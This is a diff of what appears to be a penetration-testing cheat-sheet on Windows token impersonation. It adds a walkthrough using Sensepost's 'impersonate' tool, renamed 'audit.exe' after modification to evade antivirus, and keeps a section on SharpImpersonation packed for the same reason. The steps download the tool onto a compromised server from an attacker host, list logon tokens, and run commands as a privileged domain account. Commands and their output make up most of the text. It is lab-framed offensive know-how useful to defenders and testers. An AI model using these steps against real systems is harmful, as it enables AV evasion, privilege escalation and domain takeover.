@@ -13,11 +13,185 @@ If one the logged accounts is highly privileged, then you can impersonate it to 
 Numerous tools and scripts can be used to impersonate/manipulate/alter Windows authentication tokens in processes.
 > https://github.com/S3cur3Th1sSh1t/SharpImpersonation
 > https://github.com/0xbadjuju/Tokenvator
+> https://github.com/sensepost/impersonate
+> https://github.com/zblurx/impersonate-rs
 > ...
 
-=========================================================================================================================================================
-PoC/Basic example - Windows token impersonation of a highly privileged Domain account logged on a Windows server that we have compromised 
-=========================================================================================================================================================
+
+=====================================================================================================================================
+PoC/Basic example 1 - Windows token impersonation (using Sensepost's impersonate tool) of a highly privileged Domain account logged 
+                      on a Windows server that we have compromised 
+=====================================================================================================================================
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 1. Download, modify and compile the source code of the tool 'Impersonate'
+------------------------------------------------------------------------------------------------------------------------------------
+
+> https://github.com/sensepost/impersonate
+
+I modified the source code and renamed the tool "audit.exe" to bypass AV detection.
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download the tool on a target Windows server that you have compromised (Windows Defender AV is enabled)
+------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 8/6/2024 4:44:01 AM
+
+PS C:\Temp> wget -URI http://192.168.10.10/audit.exe -OutFile C:\Temp\audit.exe
+
+PS C:\Temp> dir audit.exe
+
+    Directory: C:\Temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2024   6:32 PM         151552 audit.exe
+
+------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Use the tool to execute OS commands as a highly privileged Domain account logged on the target Windows server 
+------------------------------------------------------------------------------------------------------------------------------------
+
+> 3.1 - Start a CMD prompt as a local administrator (in our example we used the account 'lab\auditor')
+------------------------------------------------------------------------------------------------------
+
+PS C:\Temp> whoami
+lab\auditor
+
+PS C:\Temp> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+
+C:\Temp> Audit.exe
+Usage:
+- To list available tokens: Audit.exe list
+- To escalate to domain admin: Audit.exe adduser <dom admin token id> <username> <password> <domain admin group> <domain controller>
+- To run command: Audit.exe exec <token id> <command>
+
+> 3.2 - Then use the tool to list all the available tokens and look for a highly privileged Domain account to impersonate
+--------------------------------------------------------------------------------------------------------------------------
+
+C:\Temp> Audit.exe list
+
+[?] Enabling SeAssignPrimaryToken
+        [*] SeAssignPrimaryToken owned!
+        [*] SeAssignPrimaryToken enabled!
+[?] Enabling SeDebugPrivilege
+        [*] SeDebugPrivilege owned!
+        [*] SeDebugPrivilege enabled!
+
+[*] Listing available tokens
+[ID:  0][SESSION: 0][INTEGRITY: High  ][TokenPrimary      ][                      ] User: AUTORITE NT/SystÞme
+[ID:  1][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: AUTORITE NT/SystÞme
+[ID:  2][SESSION: 2][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-2
+[ID:  3][SESSION: 7][INTEGRITY: High  ][TokenPrimary      ][                      ] User: LAB/auditor
+[ID:  4][SESSION: 0][INTEGRITY: High  ][TokenPrimary      ][                      ] User: LAB/webadmin
+[ID:  5][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: AUTORITE NT/SERVICE R╔SEAU
+[ID:  6][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Font Driver Host/UMFD-0
+[ID:  7][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: AUTORITE NT/SERVICE LOCAL
+[ID:  8][SESSION: 3][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: LAB/auditor
+[ID:  9][SESSION: 1][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-1
+[ID: 10][SESSION: 1][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-1
+[ID: 11][SESSION: 2][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-2
+[ID: 12][SESSION: 6][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-6
+[ID: 13][SESSION: 8][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-8
+[ID: 14][SESSION: 3][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-3
+[ID: 15][SESSION: 7][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-7
+[ID: 16][SESSION: 4][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-4
+[ID: 17][SESSION: 6][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-6
+[ID: 18][SESSION: 8][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Font Driver Host/UMFD-8
+[ID: 19][SESSION: 5][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-5
+[ID: 20][SESSION: 4][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-4
+[ID: 21][SESSION: 7][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-7
+[ID: 22][SESSION: 8][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: LAB/webadmin
+[ID: 23][SESSION: 5][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: Window Manager/DWM-5
+[ID: 24][SESSION: 3][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-3
+[ID: 25][SESSION: 8][INTEGRITY: High  ][TokenPrimary      ][                      ] User: Window Manager/DWM-8
+[ID: 26][SESSION: 8][INTEGRITY: Medium][TokenPrimary      ][                      ] User: LAB/auditor
+[ID: 27][SESSION: 0][INTEGRITY: High  ][TokenPrimary      ][                      ] User: AUTORITE NT/SERVICE R╔SEAU
+[ID: 28][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityIdentification] User: AUTORITE NT/SystÞme
+[ID: 29][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityIdentification] User: AUTORITE NT/SERVICE LOCAL
+[ID: 30][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityIdentification] User: AUTORITE NT/SERVICE R╔SEAU
+[ID: 31][SESSION: 8][INTEGRITY:       ][TokenImpersonation][SecurityIdentification] User: LAB/auditor
+[ID: 32][SESSION: 8][INTEGRITY:       ][TokenImpersonation][SecurityIdentification] User: Window Manager/DWM-8
+[ID: 33][SESSION: 0][INTEGRITY: High  ][TokenPrimary      ][                      ] User: AUTORITE NT/SERVICE LOCAL
+[ID: 34][SESSION: 0][INTEGRITY:       ][TokenImpersonation][SecurityImpersonation ] User: AUTORITE NT/ANONYMOUS LOGON
+[ID: 35][SESSION: 0][INTEGRITY: Low   ][TokenPrimary      ][                      ] User: AUTORITE NT/SERVICE LOCAL
+[ID: 36][SESSION: 8][INTEGRITY: Low   ][TokenPrimary      ][                      ] User: LAB/auditor
+[ID: 37][SESSION: 8][INTEGRITY: Medium][TokenPrimary      ][                      ] User: LAB/webadmin
+
+C:\Temp>
+
+Result: 
+=> In our LAB environement the domain account 'LAB\webadmin' is administrator of all the Windows servers hosting Web applications. 
+   It is a good target to further compromise the Windows domain of our LAB environemnt.
+
+
+> 3.3 - Impersonate the target account 'lab\webadmin' to run OS command (PoC 'whoami') with its privileges
+-----------------------------------------------------------------------------------------------------------
+
+C:\Temp> Audit.exe exec 4 "whoami > C:\Temp\poc.txt"
+
+[?] Enabling SeAssignPrimaryToken
+        [*] SeAssignPrimaryToken owned!
+        [*] SeAssignPrimaryToken enabled!
+[?] Enabling SeDebugPrivilege
+        [*] SeDebugPrivilege owned!
+        [*] SeDebugPrivilege enabled!
+[*] Impersonating LAB/webadmin and launching command [cmd.exe /c whoami > C:\Temp\poc.txt] via CreateProcessWithTokenW
+
+C:\Temp> dir poc.txt
+ Volume in drive C is Windows
+ Volume Serial Number is F06E-DC58
+
+ Directory of C:\Temp
+
+08/06/2024  06:46 PM                19 poc.txt
+               1 File(s)             19 bytes
+               0 Dir(s)  54,295,789,568 bytes free
+
+C:\Temp> type poc.txt
+
+lab\webadmin
+
+
+=====================================================================================================================================
+PoC/Basic example 2 - Windows token impersonation (using the tool SharpImpersonation) of a highly privileged Domain account logged 
+                      on a Windows server that we have compromised 
+=====================================================================================================================================
 
 ------------------------------------------------------------------------------------------------------------------------------------
 Step 1. Download the source code of the tool 'SharpImpersonation', compile it and pack it to avoid static AV detection
@@ -160,12 +334,10 @@ PS C:\Temp> wget -URI http://192.168.10.10/Packed-SharpImpersonation.exe -OutFil
 Step 3 - Use the packed version of the tool 'SharpImpersonation' to execute OS commands as a highly privileged Domain account logged on the target Windows server 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-
-3.1 Start a CMD prompt as administrator and then use the tool 'SharpImpersonation' to list all the user processes and look for a highly privileged Domain account to impersonate
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+3.1 Start a CMD prompt as administrator, then use the tool 'SharpImpersonation' to list all the user processes and look for a highly privileged Domain account to impersonate
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 C:\Temp> Packed-SharpImpersonation.exe list
-
    _____ __                     ____                                                 __  _
   / ___// /_  ____ __________  /  _/___ ___  ____  ___  ______________  ____  ____ _/ /_(_)___  ____
   \__ \/ __ \/ __ `/ ___/ __ \ / // __ `__ \/ __ \/ _ \/ ___/ ___/ __ \/ __ \/ __ `/ __/ / __ \/ __ \
@@ -189,7 +361,6 @@ Font Driver Host\UMFD-0       1396
 
 
 C:\Temp> Packed-SharpImpersonation.exe list elevated
-
    _____ __                     ____                                                 __  _
   / ___// /_  ____ __________  /  _/___ ___  ____  ___  ______________  ____  ____ _/ /_(_)___  ____
   \__ \/ __ \/ __ `/ ___/ __ \ / // __ `__ \/ __ \/ _ \/ ___/ ___/ __ \/ __ \/ __ `/ __/ / __ \/ __ \
@@ -221,9 +392,7 @@ Result:
 3.2 Impersonate the target account 'lab\webadmin' to run OS command (PoC 'whoami') with its privileges
 -------------------------------------------------------------------------------------------------------
 
-
 C:\Temp> Packed-SharpImpersonation.exe user:LAB\webadmin binary:"powershell.exe whoami;pause"
-
    _____ __                     ____                                                 __  _
   / ___// /_  ____ __________  /  _/___ ___  ____  ___  ______________  ____  ____ _/ /_(_)___  ____
   \__ \/ __ \/ __ `/ ___/ __ \ / // __ `__ \/ __ \/ _ \/ ___/ ___/ __ \/ __ \/ __ `/ __/ / __ \/ __ \
